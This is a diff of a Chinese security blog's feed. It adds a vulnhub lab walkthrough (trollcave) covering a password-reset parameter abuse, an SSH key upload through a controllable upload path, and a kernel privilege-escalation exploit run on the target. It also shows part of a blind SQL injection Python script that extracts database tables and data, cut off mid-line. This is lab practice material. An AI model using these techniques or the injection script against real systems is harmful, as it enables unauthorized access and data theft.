@@ -3,17 +3,65 @@
     <id>https://ch1e.gitee.io</id>
     <title>ch1e的随笔 • Posts by &#34;web安全&#34; tag</title>
     <link href="https://ch1e.gitee.io" />
-    <updated>2021-08-20T02:29:20.685Z</updated>
-    <category term="CTF" />
-    <category term="靶场练习" />
-    <category term="web安全" />
+    <updated>2021-08-20T11:10:56.417Z</updated>
     <category term="免杀" />
     <category term="渗透测试" />
+    <category term="web安全" />
+    <category term="靶场练习" />
+    <category term="CTF" />
     <category term="数据库" />
-    <category term="C++" />
     <category term="代码审计" />
+    <category term="C++" />
     <category term="内网渗透" />
     <category term="网络协议" />
+    <entry>
+        <id>https://ch1e.gitee.io/2021/08/20/trollcave-v1-2/</id>
+        <title>vulnhub靶机练习-trollcave-v1-2</title>
+        <link rel="alternate" href="https://ch1e.gitee.io/2021/08/20/trollcave-v1-2/"/>
+        <content type="html">&lt;h1 id=&#34;vulhub靶场练习-trollcave-v1-2&#34;&gt;&lt;a href=&#34;#vulhub靶场练习-trollcave-v1-2&#34; class=&#34;headerlink&#34; title=&#34;vulhub靶场练习-trollcave-v1-2&#34;&gt;&lt;/a&gt;vulhub靶场练习-trollcave-v1-2&lt;/h1&gt;&lt;h2 id=&#34;信息搜集&#34;&gt;&lt;a href=&#34;#信息搜集&#34; class=&#34;headerlink&#34; title=&#34;信息搜集&#34;&gt;&lt;/a&gt;信息搜集&lt;/h2&gt;&lt;p&gt;首先对靶机进行信息搜集&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nmap -sV -sC -A 192.168.169.139&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210820191335209.png&#34; alt=&#34;image-20210820191335209&#34;&gt;&lt;/p&gt;
+&lt;p&gt;开放了80，22端口，Ubuntu系统，我们访问80端口看看，使用谷歌的插件进行第二波信息搜集&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210820191430722.png&#34; alt=&#34;image-20210820191430722&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现他是Ruby写的网站，并且使用了Ruby on Rails框架，这里对后面的渗透有关键的影响&lt;/p&gt;
+&lt;p&gt;再来看网站内容，貌似是个cms，里面都是一些文章，还有注册登录窗口&lt;/p&gt;
+&lt;h2 id=&#34;漏洞挖掘&#34;&gt;&lt;a href=&#34;#漏洞挖掘&#34; class=&#34;headerlink&#34; title=&#34;漏洞挖掘&#34;&gt;&lt;/a&gt;漏洞挖掘&lt;/h2&gt;&lt;p&gt;点击注册发现不让注册，对登陆进行了注入，未授权，爆破等方式，全都失败了&lt;/p&gt;
+&lt;p&gt;我们又去扫描网站的目录，也都是只有跳转到登陆窗口，这时候在网站的内容里发现了突破点&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210820191656900.png&#34; alt=&#34;image-20210820191656900&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们点进来看看，他提示我们密码重置是在password_resets，我们直接访问也访问不到&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210820191728255.png&#34; alt=&#34;image-20210820191728255&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这时候实在没招了，直接看wp，在Ruby on Rails中应该访问password_resets/new&lt;/p&gt;
+&lt;p&gt;让我们重置密码，我输admin也不行，然后随便找了几个用户，发现xer这个可以重置，先试试吧&lt;/p&gt;
+&lt;p&gt;但是看到这里，我在想能不能来修改这个name来重置其他用户的密码呢&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210820191956153.png&#34; alt=&#34;image-20210820191956153&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们继续重置完xer的密码以后，登陆上去发现了一个上传文件的点，但是我们上传的时候提示被关闭了&lt;/p&gt;
+&lt;p&gt;我们继续翻，翻到users界面发现了一堆用户以及他们的权限，我们这时候发现King是超级管理员权限，想着重置他的密码，但是提示只能重置普通用户，我们直接联想到刚刚的name参数，把name改成King成功重置，然后开启文件上传权限，传了php一句话以后发现不解析，GG&lt;/p&gt;
+&lt;p&gt;又去看WP，发现这里上传路径可控，可以上传 authorized_keys 到 rails 用户下的.ssh 就可以免密码登录 ssh&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -f rails  生成ssh密钥&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mv rails.pub authorized_key&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;将 authorized_key 上传到/home/rails/.ssh/&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210820193221534.png&#34; alt=&#34;image-20210820193221534&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后登陆SSH &lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mv rails id_rsa-rails &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 600 id_rsa-rails &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh -i id_rsa-rails rails@192.168.169.139&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210820193344527.png&#34; alt=&#34;image-20210820193344527&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;后渗透提权&#34;&gt;&lt;a href=&#34;#后渗透提权&#34; class=&#34;headerlink&#34; title=&#34;后渗透提权&#34;&gt;&lt;/a&gt;后渗透提权&lt;/h2&gt;&lt;p&gt;首先先 看系统的版本  cat /etc/lsb-release&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210820193427349.png&#34; alt=&#34;image-20210820193427349&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接找提权exp，这里给出exp 下载地址&lt;a href=&#34;https://www.exploit-db.com/exploits/45010&#34;&gt;https://www.exploit-db.com/exploits/45010&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;我们先看看靶机上有没有gcc ，测试了一下没有，只能自己编译好上传了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210820194016139.png&#34; alt=&#34;image-20210820194016139&#34;&gt;&lt;/p&gt;
+&lt;p&gt;把exp下载到本地，gcc 45010.c -o exp，然后对exp进行base64编码  命令：base64 exp&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210820194125070.png&#34; alt=&#34;image-20210820194125070&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后在靶机里新建，把base64编码复制进去，然后进行解码，然后给exp777权限，然后执行&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vi 666.64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base64 -d 666.64 &amp;gt; 666&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./666&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210820194408796.png&#34; alt=&#34;image-20210820194408796&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="web安全" />
+        <category term="靶场练习" />
+        <updated>2021-08-20T11:10:56.417Z</updated>
+    </entry>
     <entry>
         <id>https://ch1e.gitee.io/2021/08/20/Os-hackNos-1/</id>
         <title>vulnhub靶机练习-Os-hackNos-1</title>
@@ -86,8 +134,8 @@
 &lt;p&gt;然后使用su ch0x01e登陆即可&lt;/p&gt;
 &lt;h2 id=&#34;suid提权详解&#34;&gt;&lt;a href=&#34;#suid提权详解&#34; class=&#34;headerlink&#34; title=&#34;suid提权详解&#34;&gt;&lt;/a&gt;suid提权详解&lt;/h2&gt;&lt;p&gt;SUID是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行。SUID是一种对二进制程序进行设置的特殊权限，可以让二进制程序的执行者临时拥有属主的权限（仅对拥有执行权限的二进制程序有效）。例如，所有用户都可以执行passwd命令来修改自己的用户密码，而用户密码保存在/etc/shadow文件中。仔细查看这个文件就会发现它的默认权限是000，也就是说除了root管理员以外，所有用户都没有查看或编辑该文件的权限。但是，在使用passwd命令时如果加上SUID特殊权限位，就可让普通用户临时获得程序所有者的身份，把变更的密码信息写入到shadow文件中。这很像我们在古装剧中见到的手持尚方宝剑的钦差大臣，他手持的尚方宝剑代表的是皇上的权威，因此可以惩戒贪官，但这并不意味着他永久成为了皇上。因此这只是一种有条件的、临时的特殊权限授权方法。&lt;/p&gt;
 </content>
-        <category term="靶场练习" />
         <category term="web安全" />
+        <category term="靶场练习" />
         <updated>2021-08-20T02:29:20.685Z</updated>
     </entry>
     <entry>
@@ -200,8 +248,8 @@
 &lt;h2 id=&#34;总结&#34;&gt;&lt;a href=&#34;#总结&#34; class=&#34;headerlink&#34; title=&#34;总结&#34;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;这次pboot的代码审计是我照着yanmie师傅的文章一步步复现的，除了原本yanmie师傅文章的内容，也加了我一些个人在代码审计上分析的思路，不一定对，如果有错还是希望师傅纠正&lt;/p&gt;
 &lt;p&gt;yanmie师傅的文章地址：&lt;a href=&#34;https://www.freebuf.com/articles/web/265763.html&#34;&gt;https://www.freebuf.com/articles/web/265763.html&lt;/a&gt;&lt;/p&gt;
 </content>
-        <category term="web安全" />
         <category term="渗透测试" />
+        <category term="web安全" />
         <category term="代码审计" />
         <updated>2021-08-15T11:17:52.993Z</updated>
     </entry>
@@ -240,8 +288,8 @@
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210809141054371.png&#34; alt=&#34;image-20210809141054371&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210809141222361.png&#34; alt=&#34;image-20210809141222361&#34;&gt;&lt;/p&gt;
 </content>
-        <category term="web安全" />
         <category term="渗透测试" />
+        <category term="web安全" />
         <category term="代码审计" />
         <updated>2021-08-09T03:14:55.564Z</updated>
     </entry>
@@ -322,8 +370,8 @@
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807135418238.png&#34; alt=&#34;image-20210807135418238&#34;&gt;&lt;/p&gt;
 &lt;p&gt;这里有post的参数，菜刀肯定是连不上了，我蚁剑貌似也出了点问题&lt;/p&gt;
 </content>
-        <category term="web安全" />
         <category term="渗透测试" />
+        <category term="web安全" />
         <category term="代码审计" />
         <updated>2021-08-07T02:13:38.114Z</updated>
     </entry>
@@ -362,8 +410,8 @@
 &lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url=&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;输入需要注入的URL:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;1.爆当前数据库的数据表名&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;2.爆指定数据表的列名&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;3.爆出数据库里的数据&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;输入你要使用的功能(输入数字1,2或者3):&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select=&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;请输入你选择的功能:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (select==&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;):&lt;span class=&#34;comment&#34;&gt;#数据表个数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        table=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;):&lt;span class=&#34;comment&#34;&gt;#数据表长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; k &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;): &lt;span class=&#34;comment&#34;&gt;#数据表单个字符的ascii值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;?id=1&amp;#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i) + &lt;span class=&#34;string&#34;&gt;&amp;quot;,1) ,&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(j) + &lt;span class=&#34;string&#34;&gt;&amp;quot;,1)) = &amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(k) + &lt;span class=&#34;string&#34;&gt;&amp;quot;) --+&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;all&lt;/span&gt; = &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(url) + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                res = requests.get(&lt;span class=&#34;built_in&#34;&gt;all&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                text = res.text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                content = &lt;span class=&#34;string&#34;&gt;&amp;#x27;You are in&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                result = (text.find(content))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (result != -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    table = table + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(k)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;第&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + &lt;span class=&#34;string&#34;&gt;&amp;quot;个表的表名是:&amp;quot;&lt;/span&gt; + table)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (select==&lt;span class=&#34;string&#34;&gt;&amp;#x27;2&amp;#x27;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; a &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;):&lt;span class=&#34;comment&#34;&gt;#列的个数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        column = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; b &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;):  &lt;span class=&#34;comment&#34;&gt;# 列长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; c &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;):  &lt;span class=&#34;comment&#34;&gt;# 数据表单个字符的ascii值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;?id=1&amp;#x27; and (select ascii(substr((select column_name from information_schema.columns where table_name=&amp;#x27;users&amp;#x27; limit &amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(a)+&lt;span class=&#34;string&#34;&gt;&amp;quot;,1) ,&amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(b)+&lt;span class=&#34;string&#34;&gt;&amp;quot;,1)) = &amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(c)+&lt;span class=&#34;string&#34;&gt;&amp;quot;) --+&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;all&lt;/span&gt; = &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(url) + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                res = requests.get(&lt;span class=&#34;built_in&#34;&gt;all&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                text = res.text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                content = &lt;span class=&#34;string&#34;&gt;&amp;#x27;You are in&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                result = (text.find(content))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (result != -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    column=column+&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;第&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(a + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + &lt;span class=&#34;string&#34;&gt;&amp;quot;个列名是:&amp;quot;&lt;/span&gt; + column)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (select==&lt;span class=&#34;string&#34;&gt;&amp;#x27;3&amp;#x27;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    zd=&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;要爆哪一列的数据:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    biao=&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;要爆哪一个表的数据:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; d &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;):&lt;span class=&#34;comment&#34;&gt;#值的个数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        value = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; e &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;):  &lt;span class=&#34;comment&#34;&gt;# 